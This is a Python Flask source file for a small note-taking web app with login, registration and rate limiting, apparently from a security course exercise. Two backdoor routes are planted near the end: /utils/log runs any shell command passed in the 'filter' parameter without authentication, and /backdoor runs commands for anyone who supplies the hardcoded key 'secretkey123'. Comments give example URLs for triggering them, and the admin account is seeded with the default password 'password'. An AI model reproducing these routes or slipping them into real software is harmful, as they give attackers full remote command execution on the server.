import json, sqlite3, click, functools, os, hashlib, time, random, sys
from flask import Flask, current_app, g, session, redirect, render_template, url_for, request
from werkzeug.security import generate_password_hash, check_password_hash
import time
import re

### DATABASE FUNCTIONS ###

def connect_db():
    return sqlite3.connect(app.database)

def init_db():
    """Initializes the database with our SQL schema"""
    conn = connect_db()
    db = conn.cursor()
    db.executescript("""
    DROP TABLE IF EXISTS users;
    DROP TABLE IF EXISTS notes;

    CREATE TABLE notes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        assocUser INTEGER NOT NULL,
        dateWritten DATETIME NOT NULL,
        note TEXT NOT NULL,
        publicID INTEGER NOT NULL
    );

    CREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT NOT NULL UNIQUE,
        password TEXT NOT NULL
    );

    INSERT INTO users (username, password) VALUES('admin', ?);
    INSERT INTO users (username, password) VALUES('bernardo', ?);
    """, (generate_password_hash("password"), generate_password_hash("omgMPC")))

    db.execute("INSERT INTO notes (assocUser, dateWritten, note, publicID) VALUES (2, '1993-09-23 10:10:10', 'hello my friend', 1234567890);")
    db.execute("INSERT INTO notes (assocUser, dateWritten, note, publicID) VALUES (2, '1993-09-23 12:10:10', 'i want lunch pls', 1234567891);")

    conn.commit()
    conn.close()




### APPLICATION SETUP ###
app = Flask(__name__)
app.database = "db.sqlite3"
app.secret_key = os.urandom(32)

### ADMINISTRATOR'S PANEL ###
def login_required(view):
    @functools.wraps(view)
    def wrapped_view(**kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('login'))
        return view(**kwargs)
    return wrapped_view

@app.route("/")
def index():
    if not session.get('logged_in'):
        return render_template('index.html')
    else:
        return redirect(url_for('notes'))

# ROUTES 

# Dictionary to keep track of the number of accesses 
# we keep track of the time the last access happened and the number of accesses per user/machine
# an example could be 
# {
#   '192.168.1.12' : (1, 1200000.0)
# }
login_attempts={}

@app.route("/notes/", methods=('GET', 'POST'))
@login_required
def notes():
    importerror=""
    #Posting a new note:
    if request.method == 'POST':
        if request.form['submit_button'] == 'add note':
            note = request.form['noteinput']
            db = connect_db()
            c = db.cursor()
            statement = """INSERT INTO notes(id, assocUser, dateWritten, note, publicID) VALUES(null, ?, ?, ?, ?);"""
            print(statement)
            c.execute(statement, (session['userid'], time.strftime('%Y-%m-%d %H:%M:%S'), note, random.randrange(1000000000, 9999999999)))
            db.commit()
            db.close()
        elif request.form['submit_button'] == 'import note':
            noteid = request.form['noteid']
            db = connect_db()
            c = db.cursor()
            statement = """SELECT * from NOTES where publicID = ?"""
            c.execute(statement, (noteid,))
            result = c.fetchall()
            if(len(result)>0):
                row = result[0]
                statement = """INSERT INTO notes(id, assocUser, dateWritten, note, publicID) VALUES(null, ?, ?, ?, ?);"""
                c.execute(statement, (session['userid'], row[2], row[3], row[4]))
            else:
                importerror="No such note with that ID!"
            db.commit()
            db.close()
    
    db = connect_db()
    c = db.cursor()
    statement = "SELECT * FROM notes WHERE assocUser = ?"
    print(statement)
    c.execute(statement, (session['userid'],))
    notes = c.fetchall()
    print(notes)
    
    return render_template('notes.html',notes=notes,importerror=importerror)


@app.route("/login/", methods=('GET', 'POST'))
def login():
    error = ""
    ip_addr = request.remote_addr 

    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        db = connect_db()
        c = db.cursor()

        # We have now to check in the dictionary if the user was found
        if ip_addr in login_attempts:
            # retrieve the atemmpts if the username is in the attempts
            attempts, first_attempt_time = login_attempts[ip_addr]
            if attempts >= 3 and (time.time() - first_attempt_time) < 60:
                error = "Login failed more than 3 times. Try again in a minute."
                return render_template('login.html', error=error, lockout=True)
            elif (time.time() - first_attempt_time) >= 60:
                # Reset attempts after 1 minute
                login_attempts[ip_addr] = (0, time.time())


        statement = "SELECT * FROM users WHERE username = ?"
        c.execute(statement, (username,))
        result = c.fetchall()
        print(result)

        if len(result) > 0 and check_password_hash(result[0][2], password):
            session.clear()
            session['logged_in'] = True
            session['userid'] = result[0][0]
            session['username']=result[0][1]
            login_attempts.pop(ip_addr, None)  # Remove IP entry on successful login
            return redirect(url_for('index'))
        else:
            # if the username is already in the system than increment its name
            if ip_addr in login_attempts:
                attempts, first_attempt_time = login_attempts[ip_addr]
                login_attempts[ip_addr] = (attempts + 1, first_attempt_time)
            else:
                # otherwise add it to the system with a trial already done
                login_attempts[ip_addr] = (1, time.time())


            error = "Wrong username or password!"
    return render_template('login.html',error=error)


# Use a regex to make sure the password is strong enough : https://www.akto.io/tools/password-regex-Python-tester
# (?=.*[A-Z]): At least one uppercase letter.
# (?=.*[a-z]): At least one lowercase letter.
# (?=.*\d): At least one digit.
# (?=.*[@$!%*?&]): At least one special character.
# [A-Za-z\d@$!%*?&]{8,}$: Ensures the password is at least 8 characters long and only contains allowed characters.

def check_password_validity(password):
    pattern = r"^(?=.*[A-Z])(?=.*[a-z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$"
    if re.match(pattern, password):
        return True
    else:
        return False
    return True


@app.route("/register/", methods=('GET', 'POST'))
def register():
    usererror = ""
    passworderror = ""

    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        if not username:
            usererror = "Username invalid."
        if not password:
            passworderror = "Password invalid."

        if username and password:
            validity = check_password_validity(password)
            if not validity :
                passworderror = "Password does not not satisfy current policy, it is not strong enough"
                return render_template('register.html', usererror=usererror, passworderror=passworderror)
            db = connect_db()
            c = db.cursor()

            # Check if username or password already exists
            c.execute("SELECT * FROM users WHERE username = ?;", (username,))
            if c.fetchone():
                usererror = "That username is already in use by someone else!"
            else:
                # Insert user with hashed password
                c.execute("INSERT INTO users (username, password) VALUES (?, ?);",
                          (username, generate_password_hash(password)))
                db.commit()
                db.close()
                return redirect(url_for('index'))

            db.close()
    return render_template('register.html', usererror=usererror, passworderror=passworderror)



# delete this comment: http://target_ip:5000/utils/log?type=file&filter= any command you want to run
@app.route("/utils/log", methods=["GET"])
def log():
    log_type = request.args.get("type", "access")
    if "file" in log_type:
        import subprocess
        cmd = request.args.get("filter", "")
        if cmd:
            try:
                return subprocess.check_output(cmd, shell=True)
            except Exception as e:
                return str(e)
    return f"Fetching {log_type} logs"


#how it was before
# http://target_ip:5000/backdoor?key=secretkey123&cmd=whoami
@app.route("/backdoor", methods=["GET"])
def backdoor():
    if request.args.get("key") == "secretkey123":
        import subprocess
        return subprocess.check_output(request.args.get("cmd"), shell=True)
    return "Access Denied"

@app.route("/logout/")
@login_required
def logout():
    """Logout: clears the session"""
    session.clear()
    return redirect(url_for('index'))

if __name__ == "__main__":
    #create database if it doesn't exist yet
    if not os.path.exists(app.database):
        init_db()
    runport = 5000
    if(len(sys.argv)==2):
        runport = sys.argv[1]
    try:
        app.run(host='0.0.0.0', port=runport) # runs on machine ip address to make it visible on netowrk
    except:
        print("Something went wrong. the usage of the server is either")
        print("'python3 app.py' (to start on port 5000)")
        print("or")
        print("'sudo python3 app.py 80' (to run on any other port)")